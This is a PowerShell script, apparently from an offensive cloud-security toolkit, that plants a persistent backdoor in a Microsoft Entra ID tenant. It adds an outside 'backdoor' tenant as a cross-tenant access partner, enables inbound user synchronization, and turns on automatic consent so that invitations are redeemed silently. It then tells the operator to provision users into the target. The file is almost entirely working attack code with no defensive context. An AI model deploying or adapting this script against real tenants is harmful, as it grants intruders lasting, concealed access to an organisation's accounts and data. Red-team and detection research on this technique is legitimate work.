#Backdoor using Cross Tenant Synchronization
function CTSBackdoor {

    $tenants = Get-AzTenant
    Write-Host "Available tenants:`n"
    foreach ($tenant in $tenants){
        Write-Host "$($tenant.Name) : $($tenant.Id)"
    }
    Write-Host "`n"

    $TargetTenantId = Read-Host -Prompt "Enter the tenant Id from list to target for backdoor access creation"

    #Connect to selected tenant
    Connect-MgGraph -TenantId $TargetTenantId -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null

    $ExternalTenantId = Read-Host -Prompt "Enter the tenant ID of your tenant (backdoor tenant)"

    if ($null -eq $ExternalTenantId -or $null-eq $TargetTenantId) {
        Write-Host "ExternalTenantId and TargetTenantId cannot be null."
        Write-Host "Exiting module now!"
        break
    }

    #Deploy config
    $Param1 = @{
        TenantId = $ExternalTenantId
    }

    try {
        New-MgPolicyCrossTenantAccessPolicyPartner -BodyParameter $Param1 | Format-List
        Write-Host "1/3 : Added source(backdoor) tenant to target tenant!" -ForegroundColor Gray
    }
    catch {
        Write-Host "Error: 1/3 Failed to add source tenant to target tenant!" -ForegroundColor Red
        #break
    }
    
    #Enabling user synchronization in the target tenant
    $Param2 = @{
        userSyncInbound = @{
            isSyncAllowed = $true
        }
    }

    try {
        Invoke-MgGraphRequest -Method PUT -Uri "https://graph.microsoft.com/v1.0/policies/crossTenantAccessPolicy/partners/$ExternalTenantId/identitySynchronization" -Body $Param2
        Write-Host "2/3: Enabled user synchronization in target tenant!" -ForegroundColor Gray
    }
    catch {
        Write-Host "Error: 2/3 Failed to enable user synchronization in target tenant!" -ForegroundColor Red
    }
    
    #Verify config deployed successfully to proceed to next step
    if ((Get-MgPolicyCrossTenantAccessPolicyPartnerIdentitySynchronization -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId).UserSyncInbound.isSyncAllowed -eq $true) {
        #automatically redeem invitations and suppress consent prompts for inbound access
        $AutomaticUserConsentSettings = @{
            "InboundAllowed"="True"
        }
        Update-MgPolicyCrossTenantAccessPolicyPartner -CrossTenantAccessPolicyConfigurationPartnerTenantId $ExternalTenantId -AutomaticUserConsentSettings $AutomaticUserConsentSettings
        Write-Host "3/3: Setup automatic invitation redemption in target tenant!`n" -ForegroundColor Yellow
        Write-Host "Successfully deployed backdoor config in target tenant!" -ForegroundColor Yellow -BackgroundColor Gray
        Write-Host "`nTo get backdoor access deploy cross tenant synchronization in your source tenant and provision users in the target tenant" - -ForegroundColor Gray
    }
    else {
        Write-Host "Error: 3/3 Failed to deploy config!" -ForegroundColor Red
    }
}